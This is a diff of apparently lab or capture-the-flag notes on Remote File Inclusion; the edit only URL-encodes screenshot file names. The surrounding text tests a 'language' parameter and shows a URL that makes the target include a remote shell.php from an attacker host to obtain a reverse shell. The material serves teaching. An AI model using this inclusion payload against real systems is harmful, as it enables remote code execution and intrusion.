@@ -161,7 +161,7 @@ As we can see, this attack works in including our remote script, and we do not n
 
 # Question
 ---
-![](Pasted image 20250218151542.png)
+![](Pasted%20image%2020250218151542.png)
 
 Let's begin by verifying if the target is vulnerable to `RFI`:
 
@@ -170,7 +170,7 @@ index.php?language=http://127.0.0.1/index.php
 ```
 
 
-![](Pasted image 20250218151738.png)
+![](Pasted%20image%2020250218151738.png)
 
 As seen, the page got included, this means this site is indeed vulnerable to `RFI`, let's try sending a reverse shell:
 
@@ -181,7 +181,7 @@ http://IP:PORTindex.php?language=http://IP:PORT/shell.php
 
 Make sure to have the listener ready, once we execute the command, we get the following:
 
-![](Pasted image 20250218152111.png)
+![](Pasted%20image%2020250218152111.png)
 
 We got a reverse shell, way easier to move around rather than a webshell, let's look for our flag:
 
